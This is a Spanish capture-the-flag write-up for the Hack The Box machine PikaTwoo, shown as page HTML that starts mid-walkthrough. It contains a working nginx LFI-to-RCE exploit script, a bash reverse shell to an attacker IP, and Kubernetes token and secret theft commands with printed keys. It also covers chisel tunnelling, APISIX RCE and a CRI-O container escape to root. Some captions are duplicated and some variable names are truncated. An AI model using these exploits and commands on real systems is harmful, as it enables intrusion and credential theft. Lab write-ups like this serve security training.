<a href="/htb/PikaTwoo/29.png" target="_blank"><div><p><img src="/htb/PikaTwoo/29.png"></p></div></a>

<p class="plain-text">Aunque aquí no podemos hacer nada, hay que recordar que tenemos el puerto 443 al que no podemos acceder, y si vemos los escaneos de nmap veremos que usa la version de <code class="language-plaintext highlighter-rouge">burpsuite</code> APISIX/2.10.1 </p>
<a href="/htb/PikaTwoo/30.png" target="_blank"><div><p><img src="/htb/PikaTwoo/30.png"></p></div></a>

<p class="plain-text">Esta version tiene varias vulnerabilidades, una de ellas nos permite saltarnos la autenticacion de la API </p>
<p class="plain-text">CVE --> <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45232">CVE-2021-45232</a></p>

<p class="plain-text">Probando otras cosas vemos que si hacemos un freoxbuster al https de la pagina principal, nos da varios códigos de estado <code class="language-plaintext highlighter-rouge">403</code> para todo lo que contenga private </p>
<a href="/htb/PikaTwoo/31.png" target="_blank"><div><p><img src="/htb/PikaTwoo/31.png"></p></div></a>

<p class="plain-text">Podemos probar a hacer un curl, pero veremos que no tenemos acceso </p>
<a href="/htb/PikaTwoo/32.png" target="_blank"><div><p><img src="/htb/PikaTwoo/32.png"></p></div></a>

<p class="plain-text">si hacemos otro feroxbuster dentro del directorio /private nos encontraremos algo bastante interesante (urlencodeando e ultimo carácter para que no nos lo bloquee) </p>
<a href="/htb/PikaTwoo/33.png" target="_blank"><div><p><img src="/htb/PikaTwoo/33.png"></p></div></a>

<section class="post" id="passreset">
<br><h3 class="post-title">Abuso del apartado Password Reset</h3><br>

<p class="plain-text">Podemos acceder al /password-reset, desde burpsuite accedemos a este directorio, pero veremos el siguiente mensaje </p>
<a href="/htb/PikaTwoo/34.png" target="_blank"><div><p><img src="/htb/PikaTwoo/34.png"></p></div></a>

<p class="plain-text">Si modificamos la peticion introduciendo el email, nos dará un token, muy parecido al que nos daba al intentar recuperar la contraseña. </p>
<a href="/htb/PikaTwoo/35.png" target="_blank"><div><p><img src="/htb/PikaTwoo/35.png"></p></div></a>

<p class="plain-text">Si introducimos ese token en la peticion pasada a POST y le introducimos el token y la new password conseguiremos cambiarla al fin </p>
<a href="/htb/PikaTwoo/36.png" target="_blank"><div><p><img src="/htb/PikaTwoo/36.png"></p></div></a>

<p class="plain-text">Ahora si nos logreamos con la nueva contraseña tendremos acceso a este panel </p>
<a href="/htb/PikaTwoo/37.png" target="_blank"><div><p><img src="/htb/PikaTwoo/37.png"></p></div></a>

<p class="plain-text">Si interceptamos la primera peticion veremos esto: </p>
<a href="/htb/PikaTwoo/38.png" target="_blank"><div><p><img src="/htb/PikaTwoo/38.png"></p></div></a>

<p class="plain-text">Si le añadimos el debug nos dará otro tipo de error </p>
<a href="/htb/PikaTwoo/39.png" target="_blank"><div><p><img src="/htb/PikaTwoo/39.png"></p></div></a>

<section class="post" id="lfi">
<br><h3 class="post-title">Explotación del LFI</h3><br>

<p class="plain-text">Según este post, es posible hacer un LFI </p>
<p class="plain-text">CVE --> <a href="https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/">/CVE-2021-35368</a></p>

<p class="plain-text">La peticion seria la siguiente: </p>
<a href="/htb/PikaTwoo/40.png" target="_blank"><div><p><img src="/htb/PikaTwoo/40.png"></p></div></a>

<section class="post" id="rce">
<br><h3 class="post-title">Paso de LFI a RCE usando nginx</h3><br>

<p class="plain-text">Según este post, es posible hacer un LFI </p>
<p class="plain-text">Post --> <a href="https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/">/CVE-2021-35368</a></p>

<p class="plain-text">Si usamos este script, seremos capaces de ejecutar comandos </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ exploit.py </span><span class="p">

#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://pokatdex-api-v1.pokatmon-app.htb/admin/content/assets/add/a'

# # find nginx worker processes 
# r  = requests.get(URL, params={
#     'file': '/proc/cpuinfo'
# })
# cpus = r.text.count('processor')
cpus = 2

# r  = requests.get(URL, params={
#     'file': '/proc/sys/kernel/pid_max'
# })
# pid_max = int(r.text)
# print(f'[*] cpus: {cpus}; pid_max: {pid_max}')
pid_max = 4194304

nginx_workers = []
for pid in range(pid_max):
    r  = requests.post(URL, 
            data={'region': f'../../proc/{pid}/cmdline'},
            cookies={"SESSa": "a"}
        )

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.post(URL, data='0xdf0xdf\n<?php system("id"); /*' + 16*1024*'A') ## Ejecucion del comando

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'../../proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.post(URL, data={'region': f}, cookies={"SESSa": "a"})
            if r.text and "0xdf0xdf" in r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()</span>
</code></pre></div></div><br>

<p class="plain-text">Modificando el comando a ejecutar seremos capaces de hacer un curl a nuestra propia maquina, y el resto ya es sencillo, creamos un archivo que contenga una reverse shell a nuestro equipo </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ shell </span><span class="p">

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/4444 0>&1</span>
</code></pre></div></div><br>

<p class="plain-text">Usamos el script para que nos haga una peticion a nuestro servidor http y que se descargue este archivo en el directorio /tmp </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">10.10.14.6:8080/shell -o /tmp/shell</span></code></pre></div></div><br>

<p class="plain-text">Después ejecutamos el script una vez mas, pero con el comando para ejecutar la shell (y nos ponemos en escucha por el puerto 4444) </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ bash </span><span class="p">/tmp/shell</span></code></pre></div></div><br>

<p class="plain-text">Con esto tendremos acceso al usuario www </p>
<a href="/htb/PikaTwoo/41.png" target="_blank"><div><p><img src="/htb/PikaTwoo/41.png"></p></div></a>

<p class="plain-text">Por el nombre del usuario nos podemos dar cuenta de que estamos en un contenedor (no tiene pinta de docker porque no hay una carpeta docker en la raiz), y si hacemos un cat a este archivito, veremos que estamos en un <code class="language-plaintext highlighter-rouge">VMware</code> </p>
<a href="/htb/PikaTwoo/42.png" target="_blank"><div><p><img src="/htb/PikaTwoo/42.png"></p></div></a>

<p class="plain-text">Si nos metemos en el /sun/secrets veremos que tiene un <code class="language-plaintext highlighter-rouge">kubernetes</code> .io por lo que esta maquina esta corriendo <code class="language-plaintext highlighter-rouge">kubernetes</code> </p>
<a href="/htb/PikaTwoo/43.png" target="_blank"><div><p><img src="/htb/PikaTwoo/43.png"></p></div></a>

<p class="plain-text">También nos encontramos un token </p>
<a href="/htb/PikaTwoo/44.png" target="_blank"><div><p><img src="/htb/PikaTwoo/44.png"></p></div></a>

<section class="post" id="continer">
<br><h3 class="post-title">Explotacion de Kubernetes y APISIX para salir del contenedor</h3><br>

<p class="plain-text">Buscando sobre kubernetes me encontré este post, en el cual nos dice como bypasear la autenticacion del API de kubernetes </p>
<p class="plain-text">Post --> <a href="https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/">kubernetes.io</a></p>

<p class="plain-text">Por lo cual ejecutare estos comandos: </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve"></span><span class="p">❯ APISERVER=https://kubernetes.default.svc

❯ APISERVER=https://kubernetes.default.svc

❯ RVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount

❯ AMESPACE=$(cat ${SERVICEACCOUNT}/namespace)

❯ OKEN=$(cat ${SERVICEACCOUNT}/token)

❯ ACERT=${SERVICEACCOUNT}/ca.crt</span>
</code></pre></div></div><br>

<p class="plain-text">Modificando el comando a ejecutar seremos capaces de hacer un curl a nuestra propia maquina, y el resto ya es sencillo, creamos un archivo que contenga una reverse shell a nuestro equipo </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">--cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api ; echo

{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "192.168.49.2:8443"
    }
  ]
}</span>
</code></pre></div></div><br>

<p class="plain-text">También podemos listar los secretos de la pagina </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">--cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/$NAMESPACE/secrets</span></code></pre></div></div><br>

<p class="plain-text">Esto nos dará dos keys </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve"></span><span class="p">
❯ "APISIX_ADMIN_KEY": "YThjMmVmNWJjYzM3NmU5OTFhZjBiMjRkYTI5YzNhODc=",
❯ "APISIX_VIEWER_KEY": "OTMzY2NjZmY4YjVkNDRmNTAyYTNmMGUwOTQ3NmIxMTg="
</span>
</code></pre></div></div><br>

<p class="plain-text">Gracias a todo esto, y a esta vulnerabilidad del <code class="language-plaintext highlighter-rouge">APISIX</code>, seremos capaces de ejecutar comandos </p>
<p class="plain-text">CVE --> <a href="https://apisix.apache.org/blog/2022/02/11/cve-2022-24112/">CVE-2022-24112</a></p>

<p class="plain-text">Nos pasamos el chisel a la maquina victima y ejecutamos este comando en nuestra maquina (este proceso que vamos a hacer ahora es para poder ver la peticion en burpsuite, te lo puedes saltar si lo hacer solo con curl) </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ./chisel </span><span class="p">server --reverse --port 8081</span></code></pre></div></div><br>

<p class="plain-text">ahora comprobamos que el puerto 9080 sea el de <code class="language-plaintext highlighter-rouge">apisix-admin</code></p>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">apisix-admin:9080 -v

*   Trying 10.98.202.103:9080...
* Connected to apisix-admin (10.98.202.103) port 9080 (#0)
 GET / HTTP/1.1
 Host: apisix-admin:9080
 User-Agent: curl/7.74.0
 Accept: */*
 
* Mark bundle as not supporting multiuse
 HTTP/1.1 404 Not Found
 Date: Fri, 13 Oct 2023 23:27:37 GMT
 Content-Type: text/plain; charset=utf-8
 Transfer-Encoding: chunked
 Connection: keep-alive
 Server: APISIX/2.10.1
 
{"error_msg":"404 Route Not Found"}
* Connection #0 to host apisix-admin left intact</span>
</code></pre></div></div><br>

<p class="plain-text">viendo que es el puerto 9080 escribimos este comando en la maquina victima </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ./chisel </span><span class="p">client 10.10.14.7:8081 R:9080:apisix-admin:9080</span></code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">localhost:9080

{"error_msg":"404 Route Not Found"}</span>
</code></pre></div></div><br>

<p class="plain-text">Todo esto es para poder usar el burpsuite, y que sea mas fácil mandar la peticion para el <code class="language-plaintext highlighter-rouge">RCE</code>, ahora desde burpsuite vamos a andar una peticion basada en esta pagina  </p>
<p class="plain-text">Pagina --> <a href="https://apisix.apache.org/docs/apisix/plugins/batch-requests/">batch-requests</a></p>

<p class="plain-text">Vamos a usar esto para crear un archivo que contenga una reverse shell, para conectarnos con la maquina principal, la peticion seria esta: </p>
<a href="/htb/PikaTwoo/45.png" target="_blank"><div><p><img src="/htb/PikaTwoo/45.png"></p></div></a>

<p class="plain-text">Ahora hacemos un curl a esta nueva pagina que hemos creado, y nos ponemos en escucha, para verificar si nos hace una peticion </p>
<a href="/htb/PikaTwoo/46.png" target="_blank"><div><p><img src="/htb/PikaTwoo/46.png"></p></div></a>

<p class="plain-text">Y recibimos la peticion, perfecto ahora podemos empezar a crear la peticion para la reverse shell, para esto usaremos un comando filter, el cual nos dejara ejecutar comandos en lua, para posteriormente indicarle de ejecutarlos en shell </p>
<a href="/htb/PikaTwoo/47.png" target="_blank"><div><p><img src="/htb/PikaTwoo/47.png"></p></div></a>

<p class="plain-text">Una vez creada nos ponemos por escucha y le hacemos un curl a esta nueva pagina </p>
<a href="/htb/PikaTwoo/48.png" target="_blank"><div><p><img src="/htb/PikaTwoo/48.png"></p></div></a>

<p class="plain-text">viendo que es el puerto 9080 escribimos este comando en la maquina victima </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cat </span><span class="p">/usr/local/apisix/conf/config.yaml</span></code></pre></div></div><br>
<a href="/htb/PikaTwoo/49.png" target="_blank"><div><p><img src="/htb/PikaTwoo/49.png"></p></div></a>

<p class="plain-text">Ahora podemos conectarnos con ssh con estas credenciales y obtener la user.txt </p>
<a href="/htb/PikaTwoo/50.png" target="_blank"><div><p><img src="/htb/PikaTwoo/50.png"></p></div></a>

<section class="post" id="privesc">
<br><h3 class="post-title">Escalada de privilegios</h3><br>

<p class="plain-text">Ahora empieza la escalada de privilegios, podemos ver que en el /home hay otro usuario llamado Jennifer y en su home hay un archivo <code class="language-plaintext highlighter-rouge">template.yaml</code> </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cat </span><span class="p">template.yaml 

apiVersion: v1
kind: Pod
metadata:
  name: template-pod
spec:
  containers:
  - name: alpine
    image: alpine:latest
    imagePullPolicy: Never</span>
</code></pre></div></div><br>

<p class="plain-text">También dentro de esta misma carpeta hay un .kube (lo cual nos da a saber que esta usando un Kubernetes) y dentro de este un config </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cat </span><span class="p">config 

apiVersion: v1
clusters:
- cluster:
    certificate-authority: /home/jennifer/.minikube/ca.crt
    extensions:
    - extension:
        last-update: Fri, 18 Mar 2022 10:23:04 GMT
        provider: minikube.sigs.k8s.io
        version: v1.25.2
      name: cluster_info
    server: https://192.168.49.2:8443
  name: minikube
contexts:
- context:
    cluster: minikube
    user: jennifer
  name: jennifer-context
current-context: jennifer-context
kind: Config
preferences: {}
users:
- name: jennifer
  user:
    client-certificate: /home/jennifer/.minikube/profiles/minikube/jennifer.crt
    client-key: /home/jennifer/.minikube/profiles/minikube/jennifer.key</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos listar los "namespaces" de este config </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ kubectl </span><span class="p">--kubeconfig /home/jennifer/.kube/config get namespaces 

NAME              STATUS   AGE
applications      Active   575d
default           Active   575d
development       Active   337d
kube-node-lease   Active   575d
kube-public       Active   575d
kube-system       Active   575d</span>
</code></pre></div></div><br>

<p class="plain-text">Viendo que tenemos el config y el template.yaml podemos probar a crear un "pod" usando los namespaces que hemos listado antes (en mi caso me funciono con development) </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ kubectl  </span><span class="p">--kubeconfig /home/jennifer/.kube/config create -f template.yaml -n development

pod/template-pod created</span>
</code></pre></div></div><br>

<p class="plain-text">Viendo que tenemos el config y el template.yaml podemos probar a crear un "pod" usando los namespaces que hemos listado antes (en mi caso me funciono con development) </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ kubectl </span><span class="p">--kubeconfig /home/jennifer/.kube/config get pods -n development</span></code></pre></div></div><br>

<p class="plain-text">Podemos listar los "namespaces" de este config </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ grep </span><span class="p">-R crio 

APIServerPort:8443 KubernetesVersion:v1.23.3</span>
</code></pre></div></div><br>

<p class="plain-text">Esta version tiene una vulnerabilidad bastante reciente </p>
<p class="plain-text">CVE --> <a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/">CVE-2022-0811</a></p>

<p class="plain-text">Básicamente lo que nos dice esto es que todos los procesos de Kubernetes usan el mismo kernel, por lo que nos podemos aprovechar para inyectar comandos, primero vamos a irnos al /dev/shm (porque el /tmp se borra cada cierto tiempo), y vamos a crear dos archivos. </p>

<p class="plain-text">Podemos listar los "namespaces" de este config </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ shell.sh</span><span class="p">

#!/bin/bash

chmod +s /bin/bash</span>
</code></pre></div></div><br>

<p class="plain-text">Y ahora crearemos el .yaml malicioso, que nos ejecutara el script </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ malicius.yaml</span><span class="p">

apiVersion: v1
kind: Pod
metadata:
  name: sysctl-set
spec:
  securityContext:
   sysctls:
   - name: kernel.shm_rmid_forced
     value: "1+kernel.core_pattern=|/dev/shm/shell.sh #"
  containers:
  - name: alpine
    image: alpine:latest
    command: ["tail", "-f", "/dev/null"]</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora creamos el "pod" con este .yaml </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ kubectl </span><span class="p">--kubeconfig /home/jennifer/.kube/config create -f malicius.yaml -n development</span></code></pre></div></div><br>

<p class="plain-text">Si listamos los procesos del kernel veremos nuestro comando a la espera de ejecutarse </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cat </span><span class="p">/proc/sys/kernel/core_pattern 

|/dev/shm/shell.sh #'</span>
</code></pre></div></div><br>

<p class="plain-text">Y deslimitamos </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ulimit </span><span class="p">-c unlimited</span></code></pre></div></div><br>

<p class="plain-text">Ahora que todo esta listo, lo ejecutamos de esta manera, creamos un proceso en segundo plano </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ tail </span><span class="p">-f /dev/null &</span></code></pre></div></div><br>

<p class="plain-text">Final mente matamos este nuevo proceso de esta manera </p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ kill </span><span class="p">-SIGSEGV 1086444</span></code></pre></div></div><br>

<p class="plain-text">Y tendremos la bash con SUID </p>
<a href="/htb/PikaTwoo/51.png" target="_blank"><div><p><img src="/htb/PikaTwoo/51.png"></p></div></a>

<p class="plain-text">Ahora nos vamos al /root y visualizamos la root.txt ; ) </p>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2023 - Rug4lo</span>
  </footer><br><br>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
